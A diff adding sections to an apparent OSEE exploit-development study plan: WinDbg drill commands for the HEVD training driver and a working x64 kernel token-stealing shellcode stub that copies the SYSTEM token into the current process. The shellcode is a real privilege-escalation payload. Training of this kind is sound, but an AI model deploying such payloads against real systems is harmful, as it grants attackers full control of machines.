@@ -141,6 +141,63 @@ OSEE is a step function above OSEP. Going in without prerequisites means using l
 - Read: [[report-writing-for-pentesters]].
 - Deliverable: OSEE-format report; book exam if mock passed.
 
+## WinDbg fluency drills — internalise these before week 8
+
+Without debugger muscle memory, every kernel week takes 3x as long. Drill these against an attached HEVD VM until they are reflex.
+
+```text
+# Process / thread navigation
+!process 0 0                              ; list every EPROCESS
+!process 0 0 lsass.exe                    ; resolve by name
+.process /i /p <EPROCESS>; g              ; context switch into that process VA
+!thread <ETHREAD>                         ; walk a thread's TEB + stack
+
+# Token + privilege walk
+dt nt!_EPROCESS <addr> Token              ; pull token pointer (mask low 4 bits)
+!token <addr>                             ; dump SID, integrity, privileges
+dq <addr+offset_for_privs> L4             ; raw privilege bitmap
+
+# Pool grooming view
+!pool <addr>                              ; dump pool chunk header + nearby allocations
+!poolfind Ipgr                            ; find all chunks with pool tag 'Ipgr' (HEVD)
+!verifier 3 <driver.sys>                  ; Driver Verifier flags for the target
+
+# Stack + IRP
+kb                                        ; stack with first 3 args
+!irp <addr>                               ; dump the IRP that triggered your handler
+!analyze -v                               ; bugcheck post-mortem
+
+# Breakpoints
+bp HEVD!TriggerStackOverflow              ; symbol break
+ba w8 <addr>                              ; access-bp, 8 bytes write on addr
+bm HEVD!*Trigger*                         ; pattern-match all matching symbols
+```
+
+Drill until each one is sub-second. If a drill takes more than a few seconds because you are reading the help page, stop and re-run until it does not.
+
+## Token-stealing payload — reference implementation
+
+The classic kernel-mode shellcode pattern that every HEVD walkthrough ends with. Memorise the structure (offsets change per Windows build — extract dynamically):
+
+```nasm
+; x64 token-stealing stub — pseudocode (verify offsets per build)
+mov rax, gs:[0x188]            ; KPCR -> current_thread
+mov rax, [rax + 0xB8]          ; ETHREAD -> KPROCESS (current)
+mov rcx, rax                   ; save current EPROCESS
+.find_system:
+  mov rax, [rax + 0x448]       ; ActiveProcessLinks.Flink
+  sub rax, 0x448
+  mov rdx, [rax + 0x440]       ; UniqueProcessId
+  cmp rdx, 4                   ; SYSTEM PID
+  jne .find_system
+mov rdx, [rax + 0x4B8]         ; SYSTEM token
+and dl, 0xF0                   ; clear low ref bits
+mov [rcx + 0x4B8], rdx         ; swap into current EPROCESS
+ret
+```
+
+Practice extracting these offsets from `dt nt!_EPROCESS` so you can rebuild the stub on a build you have not seen.
+
 ## Required tooling
 
 - WinDbg + Time Travel Debugging.
